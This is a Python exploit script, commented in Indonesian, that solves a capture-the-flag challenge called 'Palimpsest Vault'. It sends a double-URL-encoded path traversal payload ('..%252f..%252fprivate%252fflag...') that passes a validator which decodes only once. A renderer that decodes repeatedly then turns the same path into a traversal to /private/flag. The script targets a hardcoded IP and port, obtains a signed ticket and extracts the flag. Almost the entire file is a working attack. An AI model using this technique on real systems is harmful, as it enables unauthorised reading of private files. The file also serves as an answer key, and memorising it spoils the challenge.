#!/usr/bin/env python3
"""
Solver Palimpsest Vault

Bug inti:
- Clerk melakukan satu kali decode/warm pass sebelum validasi dan signing.
- Renderer melakukan decode berulang sampai escape berhenti berubah.
- Target dibuat supaya setelah satu decode masih terlihat aman/public,
  tapi setelah decode berulang berubah menjadi path traversal ke private shelf.
"""

import html
import re
import sys
import urllib.parse
import urllib.request

DEFAULT_BASE = "http://35.192.106.100:21004"

# Setelah query parsing di /mint, target ini masih mengandung %252f.
# Clerk warm satu kali: %252f -> %2f, sehingga slash belum menjadi path separator.
# Normalisasi clerk melihat path tetap aman di bawah /docs/welcome/.../..
# dan menandatangani ticket.
#
# Renderer warm berulang:
#   %252f -> %2f -> /
# sehingga target menjadi:
#   /docs/welcome/../../private/flag/dummy/..
# yang akhirnya resolve ke:
#   /private/flag
TARGET = "/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/.."

FLAG_RE = re.compile(r"(?:0xV01D|0xV0ID|[A-Za-z0-9_]+CTF)\{[^}\n]+\}")


def fetch(url: str) -> tuple[int, str]:
    """Ambil URL dan kembalikan (status, body)."""
    req = urllib.request.Request(url, headers={"User-Agent": "palimpsest-solver/1.0"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body


def strip_html(body: str) -> str:
    """Bersihkan HTML supaya flag mudah diekstrak."""
    body = html.unescape(body)
    body = re.sub(r"<style.*?</style>", "", body, flags=re.S | re.I)
    body = re.sub(r"<[^>]+>", "", body)
    return "\n".join(line.strip() for line in body.splitlines() if line.strip())


def extract_ticket(mint_body: str) -> str:
    """Ambil ticket dari halaman /mint."""
    m = re.search(r"ticket=([A-Za-z0-9_.-]+)", mint_body)
    if not m:
        raise RuntimeError("ticket tidak ditemukan di response /mint")
    return m.group(1)


def main() -> int:
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else DEFAULT_BASE

    # urlencode sengaja dipakai agar karakter % pada TARGET ikut dikirim aman lewat query.
    mint_url = base + "/mint?" + urllib.parse.urlencode({"target": TARGET})
    mint_status, mint_body = fetch(mint_url)
    ticket = extract_ticket(mint_body)

    view_url = base + "/view?" + urllib.parse.urlencode({"ticket": ticket})
    view_status, view_body = fetch(view_url)
    text = strip_html(view_body)

    print(f"[+] mint status : {mint_status}")
    print(f"[+] view status : {view_status}")
    print(f"[+] target      : {TARGET}")
    print(f"[+] ticket      : {ticket}")
    print("[+] folio text:")
    print(text)

    m = FLAG_RE.search(text)
    if not m:
        print("[-] flag tidak ditemukan", file=sys.stderr)
        return 1

    print(f"\n<FLAG>{m.group(0)}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
